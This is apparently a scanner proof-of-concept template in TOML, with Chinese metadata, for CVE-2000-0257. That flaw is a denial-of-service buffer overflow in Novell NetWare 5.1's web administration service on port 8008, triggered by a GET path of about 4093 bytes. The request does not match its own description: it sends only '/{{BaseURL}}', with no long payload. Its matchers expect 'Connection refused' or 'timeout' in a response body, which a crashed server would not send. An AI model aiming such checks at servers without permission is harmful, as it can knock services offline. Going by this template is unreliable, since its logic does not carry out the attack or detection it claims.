[info]
author = "AVE"
description = "Novell NetWare 5.1 远程管理 Web 服务 (端口 8008) 存在缓冲区溢出漏洞，向服务器发送超长 GET 请求路径（约 4093 字节）可触发崩溃，导致拒绝服务。来自 ExploitDB 19854 的公开 PoC。"
id = "POC-AVE-2000-0231"
name = "Novell NetWare 5.1 Remote Web Administration Buffer Overflow PoC"
severity = "high"
tags = ["ave-2000-0231"]
vuln_id = [
    "CVE-2000-0257",
    "AVE-2000-0231",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection refused",
    "refused",
    "timeout",
]
